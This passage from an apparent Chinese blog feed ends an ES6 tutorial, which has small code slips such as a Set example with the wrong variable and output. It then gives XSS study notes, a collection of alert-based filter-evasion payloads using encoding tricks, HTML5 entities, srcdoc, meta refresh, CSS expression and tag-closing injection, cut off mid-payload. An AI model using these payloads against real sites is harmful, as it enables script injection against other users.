Set</h4><p>简单点解释，他就是一个没有重复数值的数组。或者说他就是一个数组的 hash 表。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> items = <span class="keyword">new</span> Set([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i of s) &#123;<span class="built_in">console</span>.<span class="built_in">log</span>(i)&#125;</span><br><span class="line"><span class="comment">// 2 3 4 5</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其遍历也是使用 val of values，他没有继承 Array 的方法，自己的几个方法是：</p><ul><li>size()：返回成员总数。</li><li>add(value)：添加某个值。</li><li>delete(value)：删除某个值。</li><li>has(value)：返回一个布尔值，表示该值是否为set的成员。</li><li>clear()：清除所有成员。</li></ul><p>转化为数组的方式：</p><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">var items =<span class="built_in"> new </span>Set([1, 2, 3, 4, 5]);</span><br><span class="line">var<span class="built_in"> array </span>= Array.from(items);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. Map</h4><p>Map 是一个\超对象"，其 key 除了可以是 String 类型之外，还可以为其他类型（如：对象）</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line">o = &#123;<span class="attr">p</span>: <span class="string">&quot;Hello World&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">m.set(o, <span class="string">&quot;content&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(m.get(o))</span><br><span class="line"><span class="comment">// &quot;content&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他的方法和 Set 差不多：</p><ul><li>size：返回成员总数。</li><li>set(key, value)：设置一个键值对。</li><li>get(key)：读取一个键。</li><li>has(key)：返回一个布尔值，表示某个键是否在Map数据结构中。</li><li>delete(key)：删除某个键。</li><li>clear()：清除所有成员。</li><li>keys()：返回键名的遍历器。</li><li>values()：返回键值的遍历器。</li><li>entries()：返回所有成员的遍历器。</li></ul><h4>3. WeakMap</h4><p>如果说Map 是一个\超对象"，那 WeakMap 就是个 \弱超对象"，他的键值只能是除 null 以外的对象。他的存在是为了方便垃圾回收。</p><h3>八、遍历器（Iterator）</h3><p>相比 Array，他对数据的管理更为紧凑，而且可操纵性也比较强，以后会成为一个比较通用的 JS 工具。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> idMaker()&#123;</span><br><span class="line">    var index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    return &#123;</span><br><span class="line">       <span class="keyword">next</span>: <span class="keyword">function</span>()&#123;</span><br><span class="line">           return &#123;value: index++, done: false&#125;;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var it = idMaker();</span><br><span class="line"></span><br><span class="line">it.<span class="keyword">next</span>().value <span class="regexp">//</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">it.<span class="keyword">next</span>().value <span class="regexp">//</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">it.<span class="keyword">next</span>().value <span class="regexp">//</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个对象只要具备了next方法，就可以用for...of循环遍历它的值。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> n of it) &#123;</span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>九、Generator 函数</h3><p>Generator就是一个改装了的 Iterator 遍历器，通过 yield 来增加一个 next() 节点。</p><p>声明一个 Generator 的方法：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> * <span class="title function_">foo</span>(<span class="params"> input </span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> res = <span class="keyword">yield</span> input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用方式：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> * <span class="title function_">foo</span>(<span class="params"> input </span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> res = <span class="keyword">yield</span> input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g = <span class="title function_">foo</span>(<span class="number">10</span>);</span><br><span class="line">g.<span class="title function_">next</span>(); <span class="comment">// &#123; value: 10, done: false &#125;</span></span><br><span class="line">g.<span class="title function_">next</span>(); <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Genrator的标识就是函数名前面有个 <code>*</code> 号，由于每个 yield 都会增加一个 next() 节点，当我们在一个 Generator 中添加多个 yield 的时候：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span>* G() &#123;</span><br><span class="line">    yield <span class="string">&#x27;Barret&#x27;</span>;</span><br><span class="line">    yield <span class="string">&#x27;Lee&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var g = G();</span><br><span class="line">g.<span class="keyword">next</span>(); <span class="regexp">//</span> <span class="string">&quot;Barret&quot;</span></span><br><span class="line">g.<span class="keyword">next</span>(); <span class="regexp">//</span> <span class="string">&quot;Lee&quot;</span></span><br><span class="line">g.<span class="keyword">next</span>(); <span class="regexp">//</span> undefined</span><br><span class="line">g.<span class="keyword">next</span>(); <span class="regexp">//</span> Error: Generator has already finished</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相比 Iterator，我更喜欢 Generator。</p><h3>十、Promise 对象</h3><p>ES6将 Promise 纳入规范之后，很多浏览器根据 Promise/A+ 规范实现了一套 API，Promise对象是对异步操作的平坦式表达，避免了 callback hell，也就是多层嵌套的回调函数。这方面的东西可以参考我之前写的 <a href="http://www.cnblogs.com/hustskyking/p/javascript-asynchronous-programming.html">JavaScript异步编程原理</a>.</p><p>这里是 <a href="http://promisesaplus.com/" target="_blank">Promise/A+</a> 规范文档，感兴趣的可以阅读一下。</p><p>在Promises/A规范中，每个任务都有三种状态：默认(pending)、完成(fulfilled)、失败(rejected)。</p><ul><li>默认状态可以单向转移到完成状态，这个过程叫resolve，对应的方法是deferred.resolve(promiseOrValue)；</li><li>默认状态还可以单向转移到失败状态，这个过程叫reject，对应的方法是deferred.reject(reason)；</li><li>默认状态时，还可以通过deferred.notify(update)来宣告任务执行信息，如执行进度；</li><li>状态的转移是一次性的，一旦任务由初始的pending转为其他状态，就会进入到下一个任务的执行过程中。</li></ul><h3>十一、Class和Module</h3><h4>1. Class</h4><p>Class，对象模板：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(x, y) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = x;</span><br><span class="line">    <span class="keyword">this</span>.y = y;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  toString() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;(&#x27;</span>+<span class="keyword">this</span>.x+<span class="string">&#x27;, &#x27;</span>+<span class="keyword">this</span>.y+<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一下子就有了 C++/Java 的感觉了，在类中可以使用 extends 继承：</p><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ColorPoint</span> <span class="keyword">extends</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  constructor(x, y, color) &#123;</span><br><span class="line">    <span class="keyword">super</span>(x, y); <span class="comment">// same as super.constructor(x, y)</span></span><br><span class="line">    <span class="keyword">this</span>.color = color;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  toString() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.color+&#x27; &#x27;+<span class="keyword">super</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. Module</h4><p>之前在<a href="http://www.cnblogs.com/hustskyking/p/how-to-achieve-loading-module.html">这篇文章</a>谈过模块化编程的必要性，时代在变化，需求也在变，ES6引入 Module 也算是与时俱进。ES6允许将独立的js文件作为模块，也就是说，允许一个JavaScript脚本文件调用另一个脚本文件，从而使得模块化编程成为可能。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// circle.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">area</span>(<span class="params">radius</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="property">PI</span> * radius * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">circumference</span>(<span class="params">radius</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * <span class="title class_">Math</span>.<span class="property">PI</span> * radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果我们要引入 circle.js 的函数，可以：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"></span><br><span class="line">import &#123; <span class="built_in">area</span>, circumference &#125; from <span class="string">&#x27;circle&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;圆面积：&quot;</span> + <span class="built_in">area</span>(<span class="number">4</span>));</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;圆周长：&quot;</span> + circumference(<span class="number">14</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果要引入整个 circle 的内容：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">// main.js</span><br><span class="line"></span><br><span class="line">module <span class="type">circle</span> <span class="keyword">from</span> <span class="string">&#x27;circle&#x27;</span>;</span><br><span class="line"></span><br><span class="line">console.log(&quot;圆面积：&quot; + <span class="type">circle</span>.area(<span class="number">4</span>));</span><br><span class="line">console.log(&quot;圆周长：&quot; + <span class="type">circle</span>.circumference(<span class="number">14</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>模块之间的继承使用这条命令：</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="comment">// other.js</span></span><br><span class="line"><span class="keyword">export</span> * <span class="keyword">from</span> <span class="string">&#x27;circle&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个东西，很好用，可惜了，纯洁的 JS，被糟蹋成啥样了=. =</p><h3>十二、感谢</h3><p>本文的书写逻辑参考阮一峰的<a href="http://es6.ruanyifeng.com/" target="_blank">总结</a>，并参入了一些个人主观色彩，感谢前人栽树！</p><h3>十三、参考资料</h3><ul><li><a href="http://es6.ruanyifeng.com/" target="_blank">http://es6.ruanyifeng.com/</a> 阮一峰</li><li><a href="http://www.web-tinker.com/article/20558.html" target="_blank">http://www.web-tinker.com/article/20558.html</a> <a href="http://www.web-tinker.com/article/20468.html" target="_blank">http://www.web-tinker.com/article/20468.html</a><a href="http://www.web-tinker.com/article/20520.html" target="_blank">http://www.web-tinker.com/article/20520.html</a> 次碳酸钴</li><li><a href="http://huangj.in/765" target="_blank">http://huangj.in/765</a> H-Jin</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> ES6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS零碎指南</title>
      <link href="/blog/2014/05/01/cb-xss-snippets/"/>
      <url>/blog/2014/05/01/cb-xss-snippets/</url>
      
        <content type="html"><![CDATA[<p>该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。</p><h3>一、XSS学习提要</h3><ol><li><a href="http://qdemo.sinaapp.com/ppt/xss/" target="_blank">http://qdemo.sinaapp.com/ppt/xss/</a> 三水清 简单介绍 xss</li><li><a href="http://drops.wooyun.org/tips/689" target="_blank">http://drops.wooyun.org/tips/689</a> 乌云 xss与字符编码</li><li><a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank">http://www.wooyun.org/whitehats/心伤的瘦子</a> 系列教程</li><li><a href="http://ha.ckers.org/xss.html" target="_blank">http://ha.ckers.org/xss.html</a> 反射性XSS详细分析和解释</li><li><a href="http://html5sec.org/" target="_blank">http://html5sec.org/</a> 各种技巧 ★★★★★</li></ol><h3>二、XSS攻击要点</h3><p><strong>注意：</strong>这些插入和修改都是为了避开浏览器自身的过滤，或者开发者认为的过滤。</p><p><strong>1. JS函数。</strong></p><p>document.write innerHTML eval setTimeout/setInterval等等都是很多XSS攻击注入的入口</p><p><strong>2. html实体编码</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">&gt; <span class="string">&quot;alert(&quot;</span>Barret李靖<span class="string">&quot;)&quot;</span>.<span class="built_in">replace</span>(<span class="regexp">/./g</span>, <span class="keyword">function</span>(<span class="params">s</span>)&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&lt;#&quot;</span> + s.charCodeAt(<span class="number">0</span>)</span><br><span class="line">      <span class="comment">/*.toString(16) 转换成16进制也可以滴*/</span></span><br><span class="line">      + <span class="string">&quot;;&quot;</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&gt; <span class="string">&quot;&lt;#97;&lt;#108;&lt;#101;&lt;#114;&lt;#116;&lt;#40;&lt;#49;&lt;#41;&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;&lt;#97;&lt;#108;&lt;#101;&lt;#114;&lt;#116;&lt;#40;&lt;#49;&lt;#41;&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3. 如果过滤 html 实体编码，可以改成URL编码</strong></p><figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="built_in">encodeURIComponent</span>(<span class="string">&quot;&lt;#&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="string">&quot;%26%23&quot;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4. 利用 HTML5 新增字符</strong></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;colon<span class="comment">; 冒号</span></span><br><span class="line">&lt;NewLine<span class="comment">; 换行</span></span><br><span class="line"></span><br><span class="line">&lt;a href<span class="operator">=</span><span class="string">&quot;javascr&lt;NewLine;ipt&lt;colon;alert(&quot;</span> barret李靖<span class="string">&quot;)&quot;</span><span class="operator">=</span><span class="string">&quot;&quot;</span>&gt;XSS&lt;/a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>5. JS进制转换</strong></p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">&gt; <span class="string">&quot;<span class="char escape_">\74</span><span class="char escape_">\16</span>3<span class="char escape_">\14</span>3<span class="char escape_">\16</span>2<span class="char escape_">\15</span>1<span class="char escape_">\16</span>0<span class="char escape_">\16</span>4<span class="char escape_">\76</span><span class="char escape_">\14</span>1<span class="char escape_">\15</span>4<span class="char escape_">\14</span>5<span class="char escape_">\16</span>2<span class="char escape_">\16</span>4<span class="char escape_">\50</span><span class="char escape_">\61</span><span class="char escape_">\51</span><span class="char escape_">\74</span><span class="char escape_">\57</span><span class="char escape_">\16</span>3<span class="char escape_">\14</span>3<span class="char escape_">\16</span>2<span class="char escape_">\15</span>1<span class="char escape_">\16</span>0<span class="char escape_">\16</span>4<span class="char escape_">\76</span>&quot;</span></span><br><span class="line">&gt; <span class="string">&quot;&lt;script&gt;alert(&quot;</span>Barret李靖<span class="string">&quot;)&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>6. Base64转换</strong></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&gt; base64(<span class="string">&quot;&lt;script&gt;alert(&quot;</span>Barret李靖<span class="string">&quot;)&lt;/script&gt;&quot;</span>)<span class="comment">;</span></span><br><span class="line">&gt; PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg<span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">&lt;a href<span class="operator">=</span><span class="string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;XSS&lt;/a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>7. 浏览器解析非严格性</strong></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;image.jpg&quot;</span> <span class="attribute">title</span>=<span class="string">&quot;Hello World&quot;</span> <span class="attribute">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span><br><span class="line">  ↓ ↓    ↓        ↓      ↓            ↓</span><br><span class="line">  ①②   ③        ④     ⑤           ⑥</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>①中可插入 NUL字符（0x00）</p><p>②和④中空格可以使用 tab（0x0B）与换页键（0x0C），</p><p>②还可以使用 / 替换</p><p>⑤中的"在IE中也可替换成`。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">   位置      |        代码               | 可能插入或替代的代码</span><br><span class="line">------------|---------------------------|-----------------------</span><br><span class="line">&lt;的右边 |=<span class="string">&quot;&quot;</span> &lt;[here]<span class="attribute">a</span>=<span class="string">&quot;&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;...        | 控制符，空白符，非打印字符</span></span><br><span class="line"><span class="string">a标签的后门  | &lt;a[here]href=&quot;</span> <span class="built_in">..</span>.=<span class="string">&quot;&quot;</span> 同上=<span class="string">&quot;&quot;</span> href属性中间=<span class="string">&quot;&quot;</span> &lt;<span class="attribute">a</span>=<span class="string">&quot;&quot;</span> hr[here]<span class="attribute">ef</span>=<span class="string">&quot;...        | 同上+空字节</span></span><br><span class="line"><span class="string">=两边       | &lt;a href[here]=[here]&quot;</span> 所有字符=<span class="string">&quot;&quot;</span> 替换=<span class="string">&quot;|&quot;</span> href[here]<span class="string">&quot;...=&quot;</span><span class="string">&quot; union编码符号=&quot;</span><span class="string">&quot; 替换&quot;</span>=<span class="string">&quot;&quot;</span>&gt;    | 其他引号</span><br><span class="line">&gt;之前       | &lt;a <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span> [here]=<span class="string">&quot;&quot;</span>&gt;        | 任意字符</span><br><span class="line">/之前       | &lt;a <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span>&gt;...&lt;[here] <span class="attribute">a</span>=<span class="string">&quot;&quot;</span>&gt; | 空白符，控制符</span><br><span class="line">/之后       | &lt;a <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span>&gt;... | 空白符，控制符</span><br><span class="line">&gt;闭合之前    | &lt;a <span class="attribute">href</span>=<span class="string">&quot;...&quot;</span>&gt;...  | 所有字符</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></a></a>&lt;&#x2F;[here]&gt;</a></a>&lt;&#x2F;的右边&gt;</p><p><strong>8. 斜杠</strong></p><p>在字符串中斜杠（/）可以用于转义字符，比如转义 " 和 ' ，双斜杠（//）可以用来注释。这样可以很轻松的改变之前的语句，注入内容。</p><p><strong>9. 空格的处理方式</strong></p><p>在解析的时候空格被转移成 <code><nbsp;</code>,注入的时候可以使用 <code>/**/</code>来替换。</p><p><strong>10. 特殊属性</strong></p><p>1）srcdoc属性（chrome有效）</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;iframe srcdoc<span class="operator">=</span><span class="string">&quot;&lt;lt;script&lt;gt;alert(&quot;</span> barret李靖<span class="string">&quot;)&lt;lt;=&quot;</span><span class="string">&quot; script&lt;gt;&quot;</span><span class="operator">=</span><span class="string">&quot;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2）autofoucus</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus<span class="operator">=</span><span class="string">&quot;write(1)&quot;</span> autofocus&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3）object</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;object classid<span class="operator">=</span><span class="string">&quot;clsid:333c7bc4-460f-11d0-bc04-0080c7055a83&quot;</span>&gt;</span><br><span class="line">    &lt;param name<span class="operator">=</span><span class="string">&quot;dataurl&quot;</span> value<span class="operator">=</span><span class="string">&quot;javascript:alert(&quot;</span> barret李靖<span class="string">&quot;)&quot;</span><span class="operator">=</span><span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;/object&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>11.绕过浏览器过滤（crhome）</strong></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">t</span>=<span class="string">&quot;&gt;&lt;img src=&quot;</span>1&quot; <span class="attribute">onerror</span>=<span class="string">&quot;alert(&quot;</span>Barret李靖&quot;)&quot;&gt;</span><br><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attribute">id</span>=<span class="string">&quot;sClientUin&quot;</span> <span class="attribute">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>浏览器会过滤onerror中的代码，所以换种方式注入</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">?t=<span class="string">&quot;&gt;&lt;script src=&quot;</span>data:<span class="built_in">text</span>/html,&lt;<span class="keyword">script</span>&gt;alert(<span class="string">&quot; barret李靖&quot;</span>)&lt;=<span class="string">&quot;&quot;</span> <span class="keyword">script</span>=<span class="string">&quot;&quot;</span>&gt;&lt;!<span class="comment">--</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p></script></p><p>chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。</p><p><strong>12.替换URL</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xss</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-class">.xss</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>);&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;xss&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">body</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></xss><p><strong>13.抓包、换包</strong></p><h3>三、XSS攻击方式</h3><p><strong>1. javascript:和vbscript:协议执行后的结果将会映射在DOM</strong>后面。</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;javascript:&#x27;\x3cimg src\x3dx onerror=alert(&quot;</span> barret李靖<span class="string">&quot;)=&quot;</span><span class="string">&quot;&gt;&#x27;&quot;</span>&gt;click me&lt;/<span class="keyword">a</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2. 变量覆盖</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;location&quot;</span> <span class="attr">href</span>=<span class="string">&quot;bar&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(location.href)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></form><p><strong>3. meta标签</strong></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;0; url=javascript:alert(document.domain)&quot;</span>&gt;</span><br><span class="line">Javascript: 协议可能被禁止，可以使用 data:</span><br><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;0; url=data:text/html,&lt;script&gt;alert(&quot;</span> barret李靖<span class="string">&quot;)&lt;=&quot;</span><span class="string">&quot; script=&quot;</span><span class="string">&quot;&gt;&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>4. css注入</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@import</span> <span class="string">&quot;data:,*%7bx:expression(write(1))%7D&quot;</span>;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@imp</span>\ ort<span class="string">&quot;data:,*%7b- = \a %65x\pr\65 ssion(write(2))%7d&quot;</span>; </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;Stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;data:,*%7bx:expression(write(3))%7d&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p></style></p><p><strong>5. 提前闭合标签</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http://example.com/test.php?callback=cb</span><br><span class="line"></span><br><span class="line">缺陷代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span>=<span class="string">&#x27;soso.com&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    _ret=&#123;<span class="string">&quot;_res&quot;</span>:<span class="number">2</span>&#125;;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        parent.<span class="title function_">aaa</span>(_ret);</span></span><br><span class="line"><span class="language-javascript">    &#125;<span class="keyword">catch</span>(err)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">aaa</span>(_ret);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">注入：http://example.com/test.php?callback=cb<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>原理：</strong>cb为回调函数，如果后端并没有对callback字段进行过滤，则可以<code>cb&lt;/script&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;</code>这么长的一串作为函数名，然后你就懂啦~ 本方式只针对上面有缺陷的代码。</p><p><strong>6. 提前闭合双引号</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;XSS&lt;quot; onclick=&lt;quot;alert(&quot;</span> <span class="attr">barret李靖</span>&quot;)&quot;=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--&lt;img src=&quot;--&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&quot;</span><span class="attr">Barret李靖</span>&quot;)//&quot;&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&lt;/comment&gt;&lt;img 